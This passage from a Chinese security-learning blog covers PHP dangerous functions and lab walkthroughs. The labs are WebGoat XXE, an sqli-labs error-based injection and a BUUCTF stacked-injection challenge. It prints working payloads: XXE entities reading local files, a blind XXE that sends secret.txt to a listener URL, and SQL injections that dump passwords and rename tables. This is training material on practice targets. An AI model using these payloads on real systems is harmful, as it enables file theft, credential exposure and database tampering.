class="line"></span><br></pre></td></tr></table></figure>

<h3 id="8-反单引号"><a href="#8-反单引号" class="headerlink" title="8) 反单引号"></a>8) 反单引号</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `whoami`; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="四、文件包含"><a href="#四、文件包含" class="headerlink" title="四、文件包含"></a>四、文件包含</h2><p>include将会包含语句并执行指定文件 PHP的配置文件allowurlfopen和allow_url_include设置为ON  include&#x2F;require等包含函数可以加载远程文件 include include_once requeire require_once  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__FILE);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="五、php伪协议【web-study已记】"><a href="#五、php伪协议【web-study已记】" class="headerlink" title="五、php伪协议【web-study已记】"></a>五、<a href="../../../../Web-study">php伪协议【web-study已记】</a></h2><h2 id="六、文件操作类威胁函数"><a href="#六、文件操作类威胁函数" class="headerlink" title="六、文件操作类威胁函数"></a>六、文件操作类威胁函数</h2><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="selector-class">.file_put_contents</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="selector-class">.file_put_contents</span>($file, $string);</span><br><span class="line"></span><br><span class="line"><span class="number">3</span><span class="selector-class">.copy</span> <span class="built_in">highlight_file</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">4</span><span class="selector-class">.fopen</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">5</span><span class="selector-class">.read</span> <span class="built_in">file</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">6</span><span class="selector-class">.fread</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">7</span><span class="selector-class">.fgetss</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">8</span><span class="selector-class">.fgets</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">9</span><span class="selector-class">.parse_ini_file</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">10</span><span class="selector-class">.show_source</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">11</span><span class="selector-class">.file</span>()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>线下靶场学习</title>
    <url>/underline-learning/</url>
    <content><![CDATA[<p><code>为什么学习线下靶场，因为线下靶场相比更加容易理解漏洞入门，</code></p>
<p><code>而且可以看到网站的源码，从而可以锻炼代码审计能力，找出漏洞的成因，</code></p>
<p><code>尝试自己提出绕过或者防御的措施，这里只记录一下本人觉得的线下靶场印象深刻，对本人有意义的部分</code></p>
<span id="more"></span>

<h1 id="WebGoat"><a href="#WebGoat" class="headerlink" title="WebGoat"></a>WebGoat</h1><h2 id="一-XXE"><a href="#一-XXE" class="headerlink" title="一.XXE"></a>一.XXE</h2><h3 id="1-Let’s-try"><a href="#1-Let’s-try" class="headerlink" title="1.Let’s try"></a>1.Let’s try</h3><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">在此作业中，您将为照片添加评论，在提交表单时尝试使用评论字段执行 XXE 注入。尝试列出文件系统的根目录。</span><br></pre></td></tr></table></figure>





<p>我们先提交评论然后抓包试试</p>
<p><a data-fancybox="gallery" data-src="/underline-learning/image-20221015192748515.png"><img src="/underline-learning/image-20221015192748515.png" alt="image-20221015192748515"></a></p>
<p>这时我们发现评论的内容是在用<code>xml</code>进行传递，</p>
<p>可以编写<code>dtd</code>来进行内部实体注入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">root</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/&quot;</span>&gt;</span>     </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line">      <span class="symbol">&amp;root;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/underline-learning/image-20221015195142684.png"><img src="/underline-learning/image-20221015195142684.png" alt="image-20221015195142684"></a></p>
<p>成功</p>
<h3 id="2-Modern-REST-framework"><a href="#2-Modern-REST-framework" class="headerlink" title="2.Modern REST framework"></a>2.Modern REST framework</h3><h4 id="前言：-1"><a href="#前言：-1" class="headerlink" title="前言："></a>前言：</h4><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">在现代 REST 框架中，服务器可能能够接受您作为开发人员没有考虑过的数据格式。因此，这可能会导致 JSON 端点容易受到 XXE 攻击。</span><br><span class="line"></span><br><span class="line">再次进行相同的练习，但尝试执行与我们在第一个作业中所做的相同的 <span class="keyword">XML</span> <span class="title">注入。</span></span><br></pre></td></tr></table></figure>





<p>这个明显发现底下的评论传递格式不再是<code>xml</code></p>
<p>而是在用<code>json</code>进行传递</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">json：</span><br><span class="line">是一种轻量级的数据交换格式。人类很容易阅读和写作。机器很容易解析和生成。它基于 JavaScript 编程语言标准</span><br><span class="line"></span><br><span class="line">在 <span class="built_in">JSON</span> 中，它们采用以下形式：</span><br><span class="line"></span><br><span class="line">对象是一组无序的名称<span class="regexp">/值对。一个对象以&#123;（左大括号）开始，以&#125;（右大括号）结束。每个名称后跟：冒号，名称/</span>值对由逗号分隔。</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/underline-learning/image-20221015195333753.png"><img src="/underline-learning/image-20221015195333753.png" alt="image-20221015195333753"></a></p>
<p>这里我们看</p>
<p><a data-fancybox="gallery" data-src="/underline-learning/image-20221015200313439.png"><img src="/underline-learning/image-20221015200313439.png" alt="image-20221015200313439"></a></p>
<p>就知道是修改 <code>Content-Type</code></p>
<p><a data-fancybox="gallery" data-src="/underline-learning/image-20221015200353909.png"><img src="/underline-learning/image-20221015200353909.png" alt="image-20221015200353909"></a></p>
<p>我们直接把</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">Content-<span class="keyword">Type</span>: application/<span class="type">json</span></span><br><span class="line">改成</span><br><span class="line">Content-<span class="keyword">Type</span>: application/<span class="type">xml</span></span><br></pre></td></tr></table></figure>

<p>那就可以以 <code>xml</code> 形式上传评论，从而实现 <code>xxe</code> 注入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">root</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/&quot;</span>&gt;</span>     </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line">      <span class="symbol">&amp;root;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/underline-learning/image-20221015200758568.png"><img src="/underline-learning/image-20221015200758568.png" alt="image-20221015200758568"></a></p>
<p>成功</p>
<h3 id="3-Blind-XXE-assignment"><a href="#3-Blind-XXE-assignment" class="headerlink" title="3.Blind XXE assignment"></a>3.Blind XXE assignment</h3><h4 id="前言：-2"><a href="#前言：-2" class="headerlink" title="前言："></a>前言：</h4><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">在本作业中尝试制作一个 DTD，它将文件 secret<span class="selector-class">.txt</span> 的内容从 WebGoat 服务器上传到我们的 WebWolf 服务器。您可以使用 WebWolf 为您的 DTD 提供服务。secret<span class="selector-class">.txt</span> 位于此位置的 WebGoat 服务器上，因此您无需扫描所有目录和文件：</span><br><span class="line"></span><br><span class="line">你	                 地点</span><br><span class="line">Windows <span class="number">10</span>            C:\Users\Ttoc/<span class="selector-class">.webgoat-8</span>.<span class="number">2.2</span><span class="comment">//XXE/secret.txt</span></span><br><span class="line"></span><br><span class="line">尝试使用 WebWolf 登录页面上传此文件，例如：（ 注意：此端点由您完全控制）一旦您获得文件的内容，将其作为新评论发布在页面上，您将解决课程。http:<span class="comment">//127.0.0.1:9090/landing</span></span><br></pre></td></tr></table></figure>





<p>盲注就是没有回显内容，但是我们需要把我们目标服务器的敏感文件内容获取到我们的服务器</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">简而言之，</span><br><span class="line"></span><br><span class="line">webgoat开启了站点，这个站点有XXE，webgoat服务器上有个密码文件，通过XXE把这个密码文件读取，并且发送到我们自己的恶意站点webwolf，webwolf接受到这个请求就顺理成章获取了密码文件里面的密码</span><br></pre></td></tr></table></figure>



<p>这里主要利用<code>xml</code>通过<code>DTD</code>实现文件包含，</p>
<p>先把我们自己写的<code>DTD</code>文件包含在我们的服务器<code>webwolf</code>，然后在<code>webgoat</code>上通过<code>xxe</code>进行远程包含我们站点的这个<code>DTD</code>文件，然后<code>webgoat</code>在解析我们的<code>DTD</code>文件的时候就会把<code>secret.txt</code>文件内容赋值到文件并作为参数发送到我们的<code>webwolf</code>服务器</p>
<hr>
<p>我们先发送评论看看</p>
<p>这里发送的是空内容，回显的内容看来是提示，</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">需要我们先在`webwolf`上上传文件</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/underline-learning/image-20221017201611949.png"><img src="/underline-learning/image-20221017201611949.png" alt="image-20221017201611949"></a></p>
<p>我们先抓包看看webgoat的评论的解析格式是怎么样的</p>
<p><a data-fancybox="gallery" data-src="/underline-learning/image-20221017201938082.png"><img src="/underline-learning/image-20221017201938082.png" alt="image-20221017201938082"></a></p>
<p>看来是正常的<code>xml</code>解析</p>
<p>我们先在<code>webwolf</code>上上传我们的<code>evil.dtd</code>文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">write</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost:9090/landing?text=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//声明变量 write 并嵌套赋值<span class="meta">&lt;!ENTITY <span class="keyword">send</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;http://localhost:9090/landing?text=%file;&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">为什么还要用一个参数实体嵌套呢？</span><br><span class="line">因为如果我们用一个write参数实体将send外部实体的定义写进请求中，在%write;执行的过程中，%file也会被替换成相应的文本。因此最后，?text后面的值就是我们想要的内容</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/underline-learning/image-20221017205520515.png"><img src="/underline-learning/image-20221017205520515.png" alt="image-20221017205520515"></a></p>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">这里的变量赋值和前面的不同</span><br><span class="line">它是</span><br><span class="line"><span class="comment">%（空格）变量名</span></span><br><span class="line">这种命名的方式的变量只能在DTD里用，而在xml里用不了</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/underline-learning/image-20221017211907400.png"><img src="/underline-learning/image-20221017211907400.png" alt="image-20221017211907400"></a></p>
<p>上传成功后我们在<code>incoming requests</code>里看到上传路径，这样在<code>webgoat</code>就调用访问包含就行了</p>
<p><a data-fancybox="gallery" data-src="/underline-learning/image-20221017211827208.png"><img src="/underline-learning/image-20221017211827208.png" alt="image-20221017211827208"></a></p>
<p>然后我们再在<code>webgoat</code>抓包数据里构造我们的<code>payload</code></p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/Users/Ttoc/.webgoat-8.2.2/XXE/secret.txt&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">//这个路径是有这个文件，因为在执行jar文件的时候，自动生成了这个文件</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">getdtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost:9090/files/ttocplus/evil.dtd&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">//注意这里是上传路径，要写自己的</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%getdtd; </span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%write;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">//在%getdtd;后面调用%write;</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">     <span class="symbol">&amp;send;</span> </span></span><br><span class="line"><span class="language-xml">     //再调用%write里的&amp;send变量，这个变量是再嵌套的DTD语句中声明，所以需要在xml里调用</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure>

<p>虽然提示是报错，但是我们到我们的<code>webwolf</code>上查看</p>
<p><a data-fancybox="gallery" data-src="/underline-learning/image-20221018140310837.png"><img src="/underline-learning/image-20221018140310837.png" alt="image-20221018140310837"></a></p>
<hr>
<p>这个是<code>secret.txt</code>的值，我们看看<code>webwolf</code>上有没有获得该数据</p>
<p><a data-fancybox="gallery" data-src="/underline-learning/image-20221017234256596.png"><img src="/underline-learning/image-20221017234256596.png" alt="image-20221017234256596"></a></p>
<hr>
<p>成功获取</p>
<p><a data-fancybox="gallery" data-src="/underline-learning/image-20221018141126472.png"><img src="/underline-learning/image-20221018141126472.png" alt="image-20221018141126472"></a></p>
<p>成功</p>
<h1 id="SQL-labs"><a href="#SQL-labs" class="headerlink" title="SQL-labs"></a>SQL-labs</h1><p><em><u>这里不全写，详细建议找一下sql-labs天书，认真学习一下</u></em></p>
<h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>其实我们可以先在源代码中看到一个函数。<code>check_input()</code>函数。 就会了解为什么不在<code>username</code>处进行注入</p>
<p><a data-fancybox="gallery" data-src="/underline-learning/image-20220729232132515.png"><img src="/underline-learning/image-20220729232132515.png" alt="image-20220729232132515"></a></p>
<p><a data-fancybox="gallery" data-src="/underline-learning/image-20220729232104117.png"><img src="/underline-learning/image-20220729232104117.png" alt="image-20220729232104117"></a></p>
<p>这里把这几个函数解释一下，就清楚了</p>
<p><strong>★addslashes()</strong></p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">addslashes<span class="comment">()</span> 函数返回在预定义字符之前添加反斜杠的字符串。 </span><br><span class="line"></span><br><span class="line">预定义字符是： </span><br><span class="line"></span><br><span class="line">​单引号（<span class="string">&#x27;） </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">​双引号（&quot;） </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">​反斜杠（\） </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">​NULL </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">以使用函数 get_magic_quotes_gpc() 进行检测。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>



<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">语法：addslashes(<span class="built_in">string</span>) </span><br><span class="line"></span><br><span class="line">参数             描述</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>          必需。规定要转义的字符串。 </span><br><span class="line"></span><br><span class="line">返回值：         返回已转义的字符串。 </span><br><span class="line"></span><br><span class="line">PHP 版本：       <span class="number">4</span>+ </span><br></pre></td></tr></table></figure>

<p><strong>★stripslashes()</strong> </p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">函数删除由 <span class="built_in">addslashes</span>() 函数添加的反斜杠。 </span><br></pre></td></tr></table></figure>

<p><strong>★mysql_real_escape_string()</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">函数转义 <span class="keyword">SQL</span> 语句中使用的字符串中的特殊字符。 </span><br></pre></td></tr></table></figure>

<p>下列字符受影响： </p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="string">\x00</span> </span><br><span class="line"></span><br><span class="line"><span class="string">\n</span> </span><br><span class="line"></span><br><span class="line"><span class="string">\r</span> </span><br><span class="line"></span><br><span class="line"><span class="string">\</span> </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\x1a </span></span><br></pre></td></tr></table></figure>

<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。 </p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">语法：mysql_real_escape_string(<span class="built_in">string</span>,connection) </span><br><span class="line"></span><br><span class="line">参数                              描述 </span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>                            必需。规定要转义的字符串。 </span><br><span class="line"></span><br><span class="line">connection 可选。    规定 MySQL 连接。如果未规定，则使用上一个连接</span><br></pre></td></tr></table></figure>

<p>所以注入处应该在<code>passwd</code>中</p>
<p>开始先尝试注入，发现没有回显，</p>
<p>所以试试报错注入</p>
<p><code>1&#39;and updatexml(1,concat(0x7e,(select password from users),0x7e),1)#</code></p>
<p>报出<code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code></p>
<p><a data-fancybox="gallery" data-src="/underline-learning/image-20220905094419111.png"><img src="/underline-learning/image-20220905094419111.png" alt="image-20220905094419111"></a></p>
<p><u>大致意思是，在同一语句中，不能先select出同一表中的某些值，再update这个表</u></p>
<p>所以这里就需要加一个中间表，就可以绕过这个错误</p>
<p>比如</p>
<p><code>1&#39;and updatexml(1,concat(0x7e,(select password from (select password from users)a),0x7e),1)#</code></p>
<p>这里就是把<code>(select password from users)</code>的查询后的数据存入生成的新表a，然后就相当于<code>(select password from a)</code></p>
<p><a data-fancybox="gallery" data-src="/underline-learning/image-20220905094517322.png"><img src="/underline-learning/image-20220905094517322.png" alt="image-20220905094517322"></a></p>
<p>发现不能超过一行</p>
<p>于是用</p>
<p><code>1&#39;and updatexml(1,concat(0x7e,(select group_concat(password) from (select password from users)a),0x7e),1)#</code></p>
<p>成功</p>
<p><a data-fancybox="gallery" data-src="/underline-learning/image-20220905094540906.png"><img src="/underline-learning/image-20220905094540906.png" alt="image-20220905094540906"></a></p>
<h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p><a href="https://blog.csdn.net/zy15667076526/article/details/109705286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165390231016781818750292%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165390231016781818750292&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-109705286-null-null.142%5Ev11%5Epc_search_result_control_group,157%5Ev12%5Econtrol&utm_term=dvwa&spm=1018.2226.3001.4187">推荐文章链接</a></p>
<p><em><u>不要只知道payload，要仔细分析理解源码，找出出现漏洞的原因点</u></em></p>
<p><u><code>建议看推荐文章，下面代码审计和题目分析仅是我个人能力结果，只能尽可能说到点处</code></u></p>
<p><u><code>而且部分也是借鉴推荐文章内容</code></u></p>
<h1 id="Upload-labs"><a href="#Upload-labs" class="headerlink" title="Upload-labs"></a>Upload-labs</h1><p>建议看文章，最后几关二次渲染和条件竞争建议仔细学习一下</p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf靶场wp</title>
    <url>/wp-buuctf/</url>
    <content><![CDATA[<p><code>web各个方面选择了一些题目进行学习，感觉还是得第一次就应该看通彻，不应该留有问题，能够明白原理和代码中哪出造成这个的原因，反复嚼剩饭感觉浪费时间</code></p>
<span id="more"></span>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-强网杯-2019-随便注"><a href="#1-强网杯-2019-随便注" class="headerlink" title="1.[强网杯 2019]随便注"></a>1.[强网杯 2019]随便注</h2><h3 id="1）题目描述"><a href="#1）题目描述" class="headerlink" title="1）题目描述"></a>1）题目描述</h3><p>无</p>
<h3 id="2）wp"><a href="#2）wp" class="headerlink" title="2）wp"></a>2）wp</h3><p>因为之前没有了解过堆叠注入，这里挨个分析学习</p>
<p>先来确定sql注入</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220701113045499.png"><img src="/wp-buuctf/image-20220701113045499.png" alt="image-20220701113045499"></a></p>
<p>然后试试显示所有数据，感觉看不到什么意思，后面一步步分析</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; or <span class="number">1</span>=<span class="number">1</span>;#</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220702105520465.png"><img src="/wp-buuctf/image-20220702105520465.png" alt="image-20220702105520465"></a></p>
<p>然后判断字段</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220701113210998.png"><img src="/wp-buuctf/image-20220701113210998.png" alt="image-20220701113210998"></a></p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220701113228972.png"><img src="/wp-buuctf/image-20220701113228972.png" alt="image-20220701113228972"></a></p>
<p>判断处字段数为2</p>
<p>然后用<strong>联合注入</strong></p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220701113604165.png"><img src="/wp-buuctf/image-20220701113604165.png" alt="image-20220701113604165"></a></p>
<p>发现select被正则匹配过滤了，用大小写绕过也不行，所以只能换一种方法</p>
<p>可以先了解<a href="../../../../2022/05/28/Web-study">堆叠注入</a>的概念和注入方式</p>
<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a><strong>堆叠注入</strong></h4><p>先查看所有的数据库</p>
<p><code>注：这里仍然要查询数据为假，比如-1，不然就不会执行后面的sql语句</code></p>
<p><code>;间隔sql语句</code></p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;<span class="keyword">show</span> databases;<span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220701224154901.png"><img src="/wp-buuctf/image-20220701224154901.png" alt="image-20220701224154901"></a></p>
<p>根据题目名字，先调用supersqli这个库的表看看</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;<span class="keyword">use</span> supersqli;<span class="keyword">show</span> tables;<span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220701222551203.png"><img src="/wp-buuctf/image-20220701222551203.png" alt="image-20220701222551203"></a></p>
<p>看到有两个表，先看一下纯数字的表里的内容</p>
<p> <strong><u>注：当纯数字字符串是表名的时候需要加反引号&#96;</u></strong></p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;<span class="keyword">use</span> supersqli;<span class="keyword">show</span> columns from`<span class="number">1919810931114514</span>`;<span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220701224603433.png"><img src="/wp-buuctf/image-20220701224603433.png" alt="image-20220701224603433"></a></p>
<p>看到flag在里面，再看看words里</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;use supersqli;show columns <span class="keyword">from</span> <span class="built_in">words</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220701233450179.png"><img src="/wp-buuctf/image-20220701233450179.png" alt="image-20220701233450179"></a></p>
<p><code>VARCHAR(M)是一种比CHAR更加灵活的数据类型，同样用于表示字符数据，但是VARCHAR可以保存可变长度的字符串</code></p>
<p>这里猜测，因为flag是字符串，所以猜测输入框查询的就是words表</p>
<p>后台sql语句可能（xx为输入框的内容）</p>
<p><code>select id,data from words where id=xx</code></p>
<hr>
<p>更改表名列名</p>
<p>1，通过 rename 先把 words 表改名为其他的表名。</p>
<p>2，把 1919810931114514 表的名字改为 words 。</p>
<p>3 ，将修改后的 words 表中flag列名改成列名 id ，这样只需进行正常查询就会按上面猜测后台sql语句一样显示出flag</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;rename table `<span class="built_in">words</span>` <span class="keyword">to</span> words2;rename table `<span class="number">1919810931114514</span>` <span class="keyword">to</span> <span class="built_in">words</span>;alter table <span class="built_in">words</span> change flag <span class="built_in">id</span> varchar(<span class="number">100</span>);show tables;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>show tables</code>主要看看改成功没有，这里改表名要有顺序，如果先改数字表，那就出现两个words表，导致语句不能执行，所以需要先改words表名为其他名字，然后修改数字表为words；避免因为名字而发生命令冲突</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220702220112706.png"><img src="/wp-buuctf/image-20220702220112706.png" alt="image-20220702220112706"></a></p>
<p>可以看到表<code>1919810931114514</code>名字被改成了可查询表<code>words</code></p>
<p>再看看words表的列，flag变成了id，NO变成了YES</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220702220308651.png"><img src="/wp-buuctf/image-20220702220308651.png" alt="image-20220702220308651"></a></p>
<p>因为flag为id了，用<code>1&#39; or 1=1;#</code>恒真测试使其回显</p>
<p>看看回显数据</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220702221617795.png"><img src="/wp-buuctf/image-20220702221617795.png" alt="image-20220702221617795"></a></p>
<p>得到flag</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQl</span>的<span class="keyword">rename</span></span><br><span class="line">用于重命名表名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>的<span class="keyword">alter</span>用法总结</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>：删除列</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> <span class="keyword">COLUMN</span> 列名</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>：增加列</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> 列名 属性 【约束】</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>：修改列的类型信息</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 CHANGE <span class="keyword">COLUMN</span> 列名 【新】列名</span><br><span class="line">新属性</span><br><span class="line"><span class="number">4</span>：重命名列</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名字 CHANGE <span class="keyword">COLUMN</span> 列名 新列名 属性</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>：重命名表</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">RENAME</span> <span class="keyword">TO</span> 表新名</span><br><span class="line"></span><br><span 